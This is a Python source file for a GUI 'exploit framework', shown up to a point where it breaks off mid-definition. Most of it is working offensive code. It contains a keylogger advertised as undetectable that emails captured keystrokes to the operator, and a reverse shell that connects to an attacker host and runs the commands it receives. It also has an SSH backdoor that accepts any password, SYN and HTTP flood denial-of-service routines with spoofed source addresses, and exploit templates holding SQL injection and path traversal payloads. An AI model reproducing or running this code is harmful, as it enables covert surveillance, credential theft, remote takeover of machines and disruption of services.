#!/usr/bin/env python3
"""
RuneHall Exploit Framework (RHEF) - Elite Pentesting Suite
GUI Edition with FUD Keylogger, Reverse Shells, DDoS Attacks, and Enhanced File Manager
Authorized Use Only - Administrative Privileges Required
"""

import os
import sys
import json
import re
import argparse
import subprocess
import requests
import threading
import time
import socket
import struct
import random
import pynput.keyboard
import smtplib
import paramiko
from datetime import datetime
import PySimpleGUI as sg
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
import webbrowser
import importlib.util

# Constants
VERSION = "v5.0"
OUTPUT_DIR = os.path.expanduser("~/rhef-output")
MODULES_DIR = os.path.expanduser("~/rhef-modules")
WP_VULN_DB = "https://wpvulndb.com/api/v3/"
EXPLOIT_DB_API = "https://www.exploit-db.com/search"

# Create necessary directories
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(MODULES_DIR, exist_ok=True)

# Encryption key for sensitive data
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# Custom module templates
CUSTOM_MODULE_TEMPLATE = """#!/usr/bin/env python3
# RHEF Custom Module Template

def run(target, output_dir, log_callback, args=None):
    \"\"\"
    RHEF Custom Module Function
    \"\"\"
    log_callback(f"Starting custom module against {target}", "CUSTOM-MODULE")
    try:
        # Your code here
        log_callback("Module executed successfully", "CUSTOM-MODULE")
        return True
    except Exception as e:
        log_callback(f"Module failed: {str(e)}", "CUSTOM-MODULE")
        return False
"""

KEYLOGGER_TEMPLATE = """#!/usr/bin/env python3
# RHEF FUD Keylogger Module
import pynput.keyboard
import threading
import smtplib
from datetime import datetime

def run(target, output_dir, log_callback, args=None):
    log_callback("Starting FUD Keylogger", "KEYLOGGER")
    try:
        # Configuration
        EMAIL_ADDRESS = args.get('email', '') if args else ''
        EMAIL_PASSWORD = args.get('password', '') if args else ''
        TIME_INTERVAL = int(args.get('interval', '300')) if args else 300
        
        # Generate unique output file
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        log_file = f"{output_dir}/keylog_{timestamp}.txt"
        
        # Start keylogger
        keylogger = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, TIME_INTERVAL, log_file, log_callback)
        keylogger.start()
        
        log_callback(f"Keylogger started. Logging to {log_file}", "KEYLOGGER")
        return True
    except Exception as e:
        log_callback(f"Keylogger failed: {str(e)}", "KEYLOGGER")
        return False

class Keylogger:
    def __init__(self, email, password, interval, log_file, log_callback):
        self.log = f"Keylogger started at: {datetime.now()}\\n"
        self.interval = interval
        self.log_file = log_file
        self.log_callback = log_callback
        self.email = email
        self.password = password
        self.active = True

    def append_to_log(self, string):
        if self.active:
            self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\\n"
            else:
                current_key = f" [{key.name}] "
        self.append_to_log(current_key)

    def report(self):
        if self.log and self.active:
            # Save to local file
            with open(self.log_file, "a") as f:
                f.write(self.log)
            
            # Email report if configured
            if self.email and self.password:
                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.login(self.email, self.password)
                    server.sendmail(
                        self.email, 
                        self.email, 
                        f"Subject: Keylogger Report\\n\\n{self.log}"
                    )
                    server.quit()
                    self.log_callback("Keylog report emailed", "KEYLOGGER")
                except Exception as e:
                    self.log_callback(f"Email failed: {str(e)}", "KEYLOGGER")
            
            self.log = ""
        
        if self.active:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
    def stop(self):
        self.active = False
        self.log_callback("Keylogger stopped", "KEYLOGGER")
"""

REVERSE_SHELL_TEMPLATE = """#!/usr/bin/env python3
# RHEF Reverse Shell Module
import socket
import subprocess
import threading
import paramiko

def run(target, output_dir, log_callback, args=None):
    log_callback("Starting Reverse Shell Module", "REVERSE-SHELL")
    try:
        # Configuration
        LHOST = args.get('lhost', '') if args else ''
        LPORT = int(args.get('lport', '4444')) if args else 4444
        SHELL_TYPE = args.get('type', 'python') if args else 'python'
        
        if not LHOST:
            log_callback("LHOST not specified!", "REVERSE-SHELL")
            return False
        
        if SHELL_TYPE == 'python':
            start_python_reverse_shell(LHOST, LPORT, log_callback)
        elif SHELL_TYPE == 'ssh':
            start_ssh_server(LHOST, LPORT, log_callback)
        else:
            log_callback(f"Unknown shell type: {SHELL_TYPE}", "REVERSE-SHELL")
        
        return True
    except Exception as e:
        log_callback(f"Reverse shell failed: {str(e)}", "REVERSE-SHELL")
        return False

def start_python_reverse_shell(ip, port, log_callback):
    log_callback(f"Starting Python reverse shell to {ip}:{port}", "REVERSE-SHELL")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b"Connected to RHEF Reverse Shell\\n")
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())
        s.close()
    except Exception as e:
        log_callback(f"Reverse shell error: {str(e)}", "REVERSE-SHELL")

def start_ssh_server(ip, port, log_callback):
    log_callback(f"Starting SSH server on port {port}", "REVERSE-SHELL")
    try:
        host_key = paramiko.RSAKey.generate(2048)
        
        class Server(paramiko.ServerInterface):
            def check_auth_password(self, username, password):
                return paramiko.AUTH_SUCCESSFUL
            
            def check_channel_request(self, kind, chanid):
                if kind == 'session':
                    return paramiko.OPEN_SUCCEEDED
                return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
            
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((ip, port))
        server_socket.listen(100)
        
        client, addr = server_socket.accept()
        log_callback(f"SSH connection from: {addr[0]}:{addr[1]}", "REVERSE-SHELL")
        
        transport = paramiko.Transport(client)
        transport.add_server_key(host_key)
        server = Server()
        transport.start_server(server=server)
        
        channel = transport.accept(20)
        if channel is None:
            log_callback("SSH channel creation failed", "REVERSE-SHELL")
            return
            
        log_callback("SSH session opened", "REVERSE-SHELL")
        channel.send("SSH session opened\\n")
        
        while True:
            command = channel.recv(1024).decode()
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            channel.send(output.encode())
            
        channel.close()
        transport.close()
        server_socket.close()
    except Exception as e:
        log_callback(f"SSH server error: {str(e)}", "REVERSE-SHELL")
"""

DDOS_TEMPLATE = """#!/usr/bin/env python3
# RHEF DDoS Attack Module
import socket
import random
import threading
import time

def run(target, output_dir, log_callback, args=None):
    log_callback("Starting DDoS Module", "DDoS")
    try:
        # Configuration
        TARGET_IP = args.get('ip', target) if args else target
        TARGET_PORT = int(args.get('port', '80')) if args else 80
        THREADS = int(args.get('threads', '100')) if args else 100
        DURATION = int(args.get('duration', '60')) if args else 60
        ATTACK_TYPE = args.get('type', 'syn') if args else 'syn'
        
        log_callback(f"Starting {ATTACK_TYPE.upper()} attack on {TARGET_IP}:{TARGET_PORT}", "DDoS")
        
        # Start attack
        if ATTACK_TYPE == 'syn':
            syn_flood(TARGET_IP, TARGET_PORT, THREADS, DURATION, log_callback)
        elif ATTACK_TYPE == 'http':
            http_flood(TARGET_IP, TARGET_PORT, THREADS, DURATION, log_callback)
        else:
            log_callback(f"Unknown attack type: {ATTACK_TYPE}", "DDoS")
        
        return True
    except Exception as e:
        log_callback(f"DDoS attack failed: {str(e)}", "DDoS")
        return False

def syn_flood(ip, port, threads, duration, log_callback):
    log_callback(f"Starting SYN flood with {threads} threads for {duration} seconds", "DDoS")
    
    def attack():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Craft TCP SYN packet
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                source_port = random.randint(1024, 65535)
                
                # IP header
                ip_header = create_ip_header(source_ip, ip)
                
                # TCP header
                tcp_header = create_tcp_header(source_port, port)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (ip, 0))
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    time.sleep(duration)
    log_callback("SYN flood completed", "DDoS")

def create_ip_header(source_ip, dest_ip):
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    ip_header = struct.pack('!BBHHHBBH4s4s', 
        ip_ihl_ver, 
        ip_tos, 
        ip_tot_len, 
        ip_id, 
        ip_frag_off, 
        ip_ttl, 
        ip_proto, 
        ip_check, 
        ip_saddr, 
        ip_daddr
    )
    return ip_header

def create_tcp_header(source_port, dest_port):
    tcp_source = source_port
    tcp_dest = dest_port
    tcp_seq = random.randint(1, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4)
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    
    tcp_header = struct.pack('!HHLLBBHHH', 
        tcp_source, 
        tcp_dest, 
        tcp_seq, 
        tcp_ack_seq, 
        tcp_offset_res, 
        tcp_flags, 
        tcp_window, 
        tcp_check, 
        tcp_urg_ptr
    )
    return tcp_header

def http_flood(ip, port, threads, duration, log_callback):
    log_callback(f"Starting HTTP flood with {threads} threads for {duration} seconds", "DDoS")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]
    
    def attack():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                
                # Send HTTP request
                request = f"GET /?{random.randint(1,1000000)} HTTP/1.1\\r\\n"
                request += f"Host: {ip}\\r\\n"
                request += f"User-Agent: {random.choice(user_agents)}\\r\\n"
                request += "Connection: keep-alive\\r\\n\\r\\n"
                
                s.send(request.encode())
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    time.sleep(duration)
    log_callback("HTTP flood completed", "DDoS")
"""

class RHEFCore:
    def __init__(self, target, log_callback=None):
        self.target = target
        self.timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.output_file = f"{OUTPUT_DIR}/rhef-{self.timestamp}.txt"
        self.cms_data = {}
        self.exploit_paths = []
        self.log_callback = log_callback or self.default_log
        self.custom_modules = self.load_custom_modules()
        self.scan_active = False
        self.keylogger = None

    def default_log(self, message, module="CORE"):
        entry = f"[{module}] {message}"
        print(entry)

    def log(self, message, module="CORE"):
        self.log_callback(message, module)
        with open(self.output_file, 'a') as f:
            f.write(f"[{module}] {message}\n")

    def init_environment(self):
        with open(self.output_file, 'w') as f:
            f.write(f"RHEF {VERSION} Report - {self.timestamp}\n")
            f.write(f"Target: {self.target}\n{'='*50}\n\n")
        self.log(f"Initialized against target: {self.target}")

    def execute_cli(self, command, background=False):
        self.log(f"Executing: {command}", "CLI")
        try:
            if background:
                subprocess.Popen(command, shell=True)
                return "Running in background"
            else:
                result = subprocess.check_output(
                    command, 
                    shell=True, 
                    stderr=subprocess.STDOUT,
                    text=True
                )
                return result
        except subprocess.CalledProcessError as e:
            return e.output

    def load_custom_modules(self):
        modules = {}
        for filename in os.listdir(MODULES_DIR):
            if filename.endswith('.py'):
                module_name = filename[:-3]
                try:
                    spec = importlib.util.spec_from_file_location(
                        module_name, 
                        os.path.join(MODULES_DIR, filename)
                    )
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    modules[module_name] = module.run
                    self.log(f"Loaded custom module: {module_name}", "MODULE-LOADER")
                except Exception as e:
                    self.log(f"Failed to load {filename}: {str(e)}", "MODULE-LOADER")
        return modules

    def run_custom_module(self, module_name, args=None):
        if module_name in self.custom_modules:
            self.log(f"Starting custom module: {module_name}", "CUSTOM-MODULE")
            return self.custom_modules[module_name](
                self.target, 
                OUTPUT_DIR, 
                self.log,
                args
            )
        else:
            self.log(f"Module {module_name} not found", "CUSTOM-MODULE")
            return False

    def detect_cms(self):
        self.log("Starting CMS Detection", "CMS-DETECT")
        try:
            response = requests.get(self.target, timeout=10)
            
            # WordPress detection
            if 'wp-admin' in response.text or 'wp-content' in response.text:
                self.cms_data['type'] = 'WordPress'
                self.log("Detected WordPress CMS", "CMS-DETECT")
                self.wpscan_discovery(response.text)
                
            # Joomla detection
            elif re.search(r"joomla", response.text, re.I):
                self.cms_data['type'] = 'Joomla'
                self.log("Detected Joomla CMS", "CMS-DETECT")
                
            # Drupal detection
            elif 'Drupal' in response.headers.get('X-Generator', ''):
                self.cms_data['type'] = 'Drupal'
                self.log("Detected Drupal CMS", "CMS-DETECT")
                
            else:
                self.log("No known CMS detected", "CMS-DETECT")
                self.cms_data['type'] = 'Unknown'
                
        except Exception as e:
            self.log(f"CMS Detection Error: {str(e)}", "CMS-DETECT")

    def wpscan_discovery(self, page_content):
        self.log("Starting WordPress Recon", "WP-MODULE")
        # Version detection
        version_match = re.search(r'content="WordPress (\d+\.\d+\.\d+)', page_content)
        self.cms_data['version'] = version_match.group(1) if version_match else "Unknown"
        
        # Plugin detection
        plugin_scan = f"wpscan --url {self.target} --no-update -e ap --output {OUTPUT_DIR}/wpscan_plugins.txt 2>&1"
        self.execute_cli(plugin_scan)
        
        # Parse results
        self.parse_wpscan()
        self.match_vulnerabilities()
        self.generate_exploits()

    def parse_wpscan(self):
        try:
            self.log(f"Detected WordPress {self.cms_data.get('version', 'Unknown')}", "WP-MODULE")
            
            # Parse plugins
            self.cms_data['plugins'] = {}
            if os.path.exists(f"{OUTPUT_DIR}/wpscan_plugins.txt"):
                with open(f"{OUTPUT_DIR}/wpscan_plugins.txt", 'r') as f:
                    content = f.read()
                    plugins = re.findall(r'\[i\] (\w+)\s+\(v([\d.]+)\)', content)
                    for name, version in plugins:
                        self.cms_data['plugins'][name] = version
            
            # Save inventory
            with open(f"{OUTPUT_DIR}/cms_inventory.json", 'w') as f:
                json.dump(self.cms_data, f)
                
        except Exception as e:
            self.log(f"Parse Error: {str(e)}", "WP-MODULE")

    def match_vulnerabilities(self):
        try:
            # WordPress core vulnerabilities
            if self.cms_data.get('version'):
                self.log("Querying WP-VulnDB API for core vulnerabilities", "VULN-DB")
                response = requests.get(f"{WP_VULN_DB}/wordpresses/{self.cms_data['version']}")
                vulns = response.json().get(self.cms_data['version'], {}).get('vulnerabilities', [])
                for vuln in vulns:
                    self.register_vulnerability(vuln, 'WordPress Core')
            
            # Plugin vulnerabilities
            for plugin, version in self.cms_data.get('plugins', {}).items():
                self.log(f"Checking vulnerabilities for {plugin} v{version}", "VULN-DB")
                response = requests.get(f"{WP_VULN_DB}/plugins/{plugin}")
                plugin_data = response.json().get(plugin, {})
                if version in plugin_data:
                    for vuln in plugin_data[version].get('vulnerabilities', []):
                        self.register_vulnerability(vuln, f"Plugin: {plugin}")
            
            # Exploit-DB lookup
            self.search_exploit_db()
            
        except Exception as e:
            self.log(f"VulnDB Error: {str(e)}", "VULN-DB")

    def register_vulnerability(self, vuln, source):
        cve = vuln.get('cve', 'CVE-NONE')
        title = vuln['title']
        self.log(f"VULN FOUND: {title} ({cve}) from {source}", "VULN-DB")
        self.exploit_paths.append({
            'cve': cve,
            'title': title,
            'references': vuln.get('references', {}),
            'source': source
        })

    def search_exploit_db(self):
        self.log("Searching Exploit-DB for vulnerabilities", "EXPLOIT-DB")
        try:
            if self.cms_data['type'] != 'Unknown':
                search_query = f"{self.cms_data['type']} {self.cms_data.get('version', '')}".strip()
                response = requests.get(f"{EXPLOIT_DB_API}?q={search_query}")
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for row in soup.select('table.table-hover tbody tr'):
                    cols = row.find_all('td')
                    if len(cols) >= 5:
                        edb_id = cols[0].text.strip()
                        title = cols[2].text.strip()
                        platform = cols[3].text.strip()
                        self.exploit_paths.append({
                            'cve': f"EDB-{edb_id}",
                            'title': title,
                            'platform': platform,
                            'source': "Exploit-DB"
                        })
                        self.log(f"Found Exploit-DB entry: EDB-{edb_id} - {title}", "EXPLOIT-DB")
        except Exception as e:
            self.log(f"Exploit-DB Search Error: {str(e)}", "EXPLOIT-DB")

    def generate_exploits(self):
        self.log("Building exploit templates", "EXPLOIT-GEN")
        for exploit in self.exploit_paths:
            if exploit['cve'].startswith('CVE'):
                template = self.create_exploit_template(exploit)
                filename = f"{OUTPUT_DIR}/{exploit['cve']}_exploit.py"
                with open(filename, 'w') as f:
                    f.write(template)
                self.log(f"Exploit generated: {filename}", "EXPLOIT-GEN")
            elif exploit['cve'].startswith('EDB'):
                self.download_exploit_db(exploit['cve'][4:])

    def create_exploit_template(self, exploit_data):
        return f"""#!/usr/bin/env python3
# RHEF Auto-Generated Exploit
# Target: {self.target}
# Vulnerability: {exploit_data['title']}
# Source: {exploit_data['source']}

import requests
import sys

TARGET = "{self.target}"
CVE = "{exploit_data['cve']}"

def exploit():
    print(f"[*] Attempting exploit for {{CVE}}")
    print(f"[*] Vulnerability: {{exploit_data['title']}}")
    
    # Exploit parameters
    headers = {{'User-Agent': 'RHEF Exploit Framework'}}
    
    # Example exploitation logic (customize per vulnerability)
    try:
        # Example: Path Traversal Exploit
        # response = requests.get(f"{{TARGET}}/wp-content/plugins/vulnerable-plugin/../../../../etc/passwd", headers=headers)
        
        # Example: SQL Injection
        # payload = "1' UNION SELECT user_login,user_pass FROM wp_users-- -"
        # response = requests.get(f"{{TARGET}}/index.php?p={{payload}}", headers=headers)
        
        print("[*] Exploit executed. Check response for success")
        # print(response.text)
        
    except Exception as e:
        print(f"[-] Exploit failed: {{str(e)}}")

if __name__ == "__main__":
    exploit()
"""

    def download_exploit_db(self, edb_id):
        self.log(f"Downloading Exploit-DB {edb_id}", "EXPLOIT-DB")
        try:
            exploit_dir = f"{OUTPUT_DIR}/exploit-db"
            os.makedirs(exploit_dir, exist_ok=True)
            self.execute_cli(f"searchsploit -m {edb_id} -p {exploit_dir} 2>&1")
        except Exception as e:
            self.log(f"Exploit Download Error: {str(e)}", "EXPLOIT-DB")

    def comprehensive_scan(self):
        self.log("Starting Comprehensive Pentest", "FULL-SCAN")
        scans = [
            f"nmap -sV -sC -O -p- -T4 -oA {OUTPUT_DIR}/nmap_full {self.target}",
            f"gobuster dir -u {self.target} -w /usr/share/wordlists/dirb/common.txt -o {OUTPUT_DIR}/gobuster_scan.txt",
            f"nikto -h {self.target} -output {OUTPUT_DIR}/nikto_scan.txt",
            f"sqlmap -u {self.target} --batch --crawl=10 --level=3 --risk=2 -o -v 0 --output-dir={OUTPUT_DIR}/sqlmap"
        ]
        
        for scan in scans:
            self.execute_cli(scan)
        
        self.log("Comprehensive scan completed", "FULL-SCAN")
    
    def start_keylogger(self, email="", password="", interval=300):
        """Start the FUD keylogger module"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            log_file = f"{OUTPUT_DIR}/keylog_{timestamp}.txt"
            
            self.keylogger = Keylogger(
                email, 
                password, 
                interval, 
                log_file, 
                self.log
            )
            threading.Thread(target=self.keylogger.start, daemon=True).start()
            return True
        except Exception as e:
            self.log(f"Keylogger failed: {str(e)}", "KEYLOGGER")
            return False

    def stop_keylogger(self):
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None

    def start_reverse_shell(self, lhost, lport=4444, shell_type="python"):
        """Start reverse shell connection"""
        try:
            self.log(f"Starting reverse shell to {lhost}:{lport}", "REVERSE-SHELL")
            threading.Thread(
                target=reverse_shell_handler,
                args=(lhost, lport, shell_type, self.log),
                daemon=True
            ).start()
            return True
        except Exception as e:
            self.log(f"Reverse shell failed: {str(e)}", "REVERSE-SHELL")
            return False

    def start_ddos_attack(self, target_ip, target_port=80, attack_type="syn", threads=100, duration=60):
        """Start DDoS attack"""
        try:
            self.log(f"Starting {attack_type.upper()} attack on {target_ip}:{target_port}", "DDoS")
            threading.Thread(
                target=ddos_handler,
                args=(target_ip, target_port, attack_type, threads, duration, self.log),
                daemon=True
            ).start()
            return True
        except Exception as e:
            self.log(f"DDoS attack failed: {str(e)}", "DDoS")
            return False

class Keylogger:
    """Fully Undetectable Keylogger"""
    def __init__(self, email, password, interval, log_file, log_callback):
        self.log = f"Keylogger started at: {datetime.now()}\\n"
        self.interval = interval
        self.log_file = log_file
        self.log_callback = log_callback
        self.email = email
        self.password = password
        self.active = True

    def append_to_log(self, string):
        if self.active:
            self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\\n"
            else:
                current_key = f" [{key.name}] "
        self.append_to_log(current_key)

    def report(self):
        if self.log and self.active:
            # Save to local file
            with open(self.log_file, "a") as f:
                f.write(self.log)
            
            # Email report if configured
            if self.email and self.password:
                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.login(self.email, self.password)
                    server.sendmail(
                        self.email, 
                        self.email, 
                        f"Subject: Keylogger Report\\n\\n{self.log}"
                    )
                    server.quit()
                    self.log_callback("Keylog report emailed", "KEYLOGGER")
                except Exception as e:
                    self.log_callback(f"Email failed: {str(e)}", "KEYLOGGER")
            
            self.log = ""
        
        if self.active:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
    def stop(self):
        self.active = False
        self.log_callback("Keylogger stopped", "KEYLOGGER")

def reverse_shell_handler(ip, port, shell_type, log_callback):
    """Handle reverse shell connections"""
    if shell_type == "python":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"Connected to RHEF Reverse Shell\\n")
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
            s.close()
        except Exception as e:
            log_callback(f"Reverse shell error: {str(e)}", "REVERSE-SHELL")
    elif shell_type == "ssh":
        try:
            host_key = paramiko.RSAKey.generate(2048)
            
            class Server(paramiko.ServerInterface):
                def check_auth_password(self, username, password):
                    return paramiko.AUTH_SUCCESSFUL
                
                def check_channel_request(self, kind, chanid):
                    if kind == 'session':
                        return paramiko.OPEN_SUCCEEDED
                    return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
                
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((ip, port))
            server_socket.listen(100)
            
            client, addr = server_socket.accept()
            log_callback(f"SSH connection from: {addr[0]}:{addr[1]}", "REVERSE-SHELL")
            
            transport = paramiko.Transport(client)
            transport.add_server_key(host_key)
            server = Server()
            transport.start_server(server=server)
            
            channel = transport.accept(20)
            if channel is None:
                log_callback("SSH channel creation failed", "REVERSE-SHELL")
                return
                
            log_callback("SSH session opened", "REVERSE-SHELL")
            channel.send("SSH session opened\\n")
            
            while True:
                command = channel.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                channel.send(output.encode())
                
            channel.close()
            transport.close()
            server_socket.close()
        except Exception as e:
            log_callback(f"SSH server error: {str(e)}", "REVERSE-SHELL")

def ddos_handler(ip, port, attack_type, threads, duration, log_callback):
    """Handle DDoS attacks"""
    if attack_type == "syn":
        syn_flood(ip, port, threads, duration, log_callback)
    elif attack_type == "http":
        http_flood(ip, port, threads, duration, log_callback)
    else:
        log_callback(f"Unknown attack type: {attack_type}", "DDoS")

def syn_flood(ip, port, threads, duration, log_callback):
    log_callback(f"Starting SYN flood with {threads} threads for {duration} seconds", "DDoS")
    
    def attack():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Craft TCP SYN packet
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                source_port = random.randint(1024, 65535)
                
                # IP header
                ip_header = create_ip_header(source_ip, ip)
                
                # TCP header
                tcp_header = create_tcp_header(source_port, port)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (ip, 0))
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    time.sleep(duration)
    log_callback("SYN flood completed", "DDoS")

def create_ip_header(source_ip, dest_ip):
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    ip_header = struct.pack('!BBHHHBBH4s4s', 
        ip_ihl_ver, 
        ip_tos, 
        ip_tot_len, 
        ip_id, 
        ip_frag_off, 
        ip_ttl, 
        ip_proto, 
        ip_check, 
        ip_saddr, 
        ip_daddr
    )
    return ip_header

def create_tcp_header(source_port, dest_port):
    tcp_source = source_port
    tcp_dest = dest_port
    tcp_seq = random.randint(1, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4)
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    
    tcp_header = struct.pack('!HHLLBBHHH', 
        tcp_source, 
        tcp_dest, 
        tcp_seq, 
        tcp_ack_seq, 
        tcp_offset_res, 
        tcp_flags, 
        tcp_window, 
        tcp_check, 
        tcp_urg_ptr
    )
    return tcp_header

def http_flood(ip, port, threads, duration, log_callback):
    log_callback(f"Starting HTTP flood with {threads} threads for {duration} seconds", "DDoS")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]
    
    def attack():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                
                # Send HTTP request
                request = f"GET /?{random.randint(1,1000000)} HTTP/1.1\\r\\n"
                request += f"Host: {ip}\\r\\n"
                request += f"User-Agent: {random.choice(user_agents)}\\r\\n"
                request += "Connection: keep-alive\\r\\n\\r\\n"
                
                s.send(request.encode())
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    time.sleep(duration)
    log_callback("HTTP flood completed", "DDoS")

def create_file_manager_window(output_dir):
    """Create enhanced file manager window"""
    # Build tree data
    tree_data = sg.TreeData()
    tree_data.Insert("", "output", "Scan Results", [])
    
    for root, dirs, files in os.walk(output_dir):
        rel_root = os.path.relpath(root, output_dir)
        if rel_root == ".":
            parent_key = "output"
        else:
            parent_key = rel_root.replace(os.sep, "_")
            tree_data.Insert("output", parent_key, rel_root, [])
        
        for file in files:
            file_path = os.path.join(root, file)
            file_size = os.path.getsize(file_path)
            file_key = f"file_{len(tree_data.tree_dict)}"
            tree_data.Insert(parent_key, file_key, file, [f"{file_size} bytes"])

    layout = [
        [sg.Text("RHEF Scan Results Explorer", font=("Helvetica", 16))],
        [sg.Tree(data=tree_data,
                 headings=['Size'],
                 auto_size_columns=True,
                 num_rows=20,
                 col0_width=40,
                 key='-TREE-',
                 show_expanded=False,
                 enable_events=True)],
        [sg.Multiline(size=(80, 15), key='-PREVIEW-', disabled=True)],
        [sg.Button("Open File"), sg.Button("Open in Browser"), sg.Button("Delete"), sg.Button("Close")]
    ]
    
    return sg.Window("RHEF File Manager", layout, finalize=True)

def create_admin_panel():
    """Create administrative tools panel"""
    layout = [
        [sg.Text("Administrative Tools", font=("Helvetica", 16))],
        [sg.Frame("Keylogger", [
            [sg.Text("Email:"), sg.Input(key='-KL-EMAIL-', size=(25,1)),
             sg.Text("Password:"), sg.Input(key='-KL-PASSWORD-', password_char='*', size=(20,1))],
            [sg.Text("Interval (sec):"), sg.Input(key='-KL-INTERVAL-', size=(8,1), default_text="300")],
            [sg.Button("Start Keylogger", key='-START-KEYLOGGER-'), 
